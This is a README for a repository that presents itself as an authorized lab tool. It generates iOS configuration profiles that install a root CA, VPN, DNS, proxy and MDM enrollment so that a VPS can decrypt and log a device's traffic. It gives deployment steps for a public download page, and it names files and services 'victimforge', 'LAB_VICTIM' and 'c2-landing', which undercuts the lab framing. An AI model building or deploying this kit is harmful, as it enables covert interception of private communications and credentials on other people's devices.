# Authorized lab: iOS traffic-inspection test rig

This repository is a lab tool for testing on devices the operator owns.
It is **not** an "awareness demo" — the profile it generates really does
route and decrypt the test device's traffic.

## Project layout

    landing/server.py                     Flask app: serves the page + /api/profile
    landing/download/victimforge.py       per-device .mobileconfig generator
    templates/profile.mobileconfig.tmpl   profile template (6 payloads)
    vps/strongswan/                       VPN gateway config + lab CA (certs/)
    vps/mitmproxy/, vps/logger/           interception + flow logging (docker-compose.yml)
    render/                               fallback proxy + log collector (Render blueprint)

## The generated profile contains

1. **Root CA** — trusts the lab mitmproxy for HTTPS interception
2. **DoH** — encrypted DNS through the lab endpoint
3. **Global HTTP proxy** — fallback path (only active on supervised devices)
4. **IKEv2 VPN** — full tunnel to the lab VPS
5. **SCEP** — device identity certificate for MDM
6. **MDM** — enrollment attempt against `LAB_MDM_HOST` (fails without a real
   APNS topic and MDM server — that failure is the expected lab observation)

## Run locally

    pip install -r landing/requirements.txt
    python3 landing/server.py          # binds 0.0.0.0:5000

Configuration is read from `LAB_*` environment variables (or edit the
constants at the top of `server.py`): `LAB_VICTIM`, `LAB_VPS_IP`,
`LAB_DOH_HOST`, `LAB_PROXY_HOST`, `LAB_PROXY_PORT`, `LAB_MDM_HOST`,
`LAB_APNS_TOPIC`, `LAB_CA`.

Two secrets are required and have no default:

- `VPN_SECRET_SALT` — long random string that seeds the per-device
  EAP/SCEP passwords; `victimforge.py` refuses to run without it (or with
  the old default `change-this-salt`).
- `COLLECT_TOKEN` — Bearer token protecting the Render log collector
  (`/ingest`, `/events`); the collector refuses to start without it.
  `proxy-fallback` needs the same token to ship logs to the collector.

## Deploy the landing page to Render

**Blueprint (render.yaml)** — `render.yaml` at the **repo root** defines
`log-collector` and `c2-landing` (a commented-out `proxy-fallback` block
is there too — see the note inside: Render's HTTP(S)-only edge can't carry
an iOS manual-proxy payload, so the fallback proxy belongs on the VPS).
Render only reads Blueprints from the repo root:

1. Commit the repo to GitHub **including `vps/strongswan/certs/ca-cert.pem`**
   (public cert only — keep `ca-key.pem` off the remote; `.gitignore` protects it).
2. Render → New → Web Service (or Blueprint) → connect the repo.
3. Build command: `pip install -r landing/requirements.txt`
4. Start command: `python landing/server.py`
5. Set the `LAB_*` env vars in the dashboard. `PORT` is injected by Render
   and honored by `server.py`.
6. Deploy. Download URL: `https://<service>.onrender.com/api/profile`

## Lab rules

- Install only on a device you own, with a test Apple account and no
  personal credentials.
- Replace all `LAB_*` placeholders before installing.
- The 6-payload profile (with MDM/SCEP) may hang or show errors on an
  **unsupervised** test device — enrollment is expected to fail without a
  real MDM server and APNS topic; the other payloads still install.
- The generator prints two secret lines (logged to the server log too):
  `victim : EAP "..."` — paste into the VPS `ipsec.secrets`;
  `victim : SCEP "..."` — the SCEP challenge (sync if a real SCEP server
  is ever stood up; both are deterministic per victim).
- Remove via Settings → General → VPN & Device Management when finished.
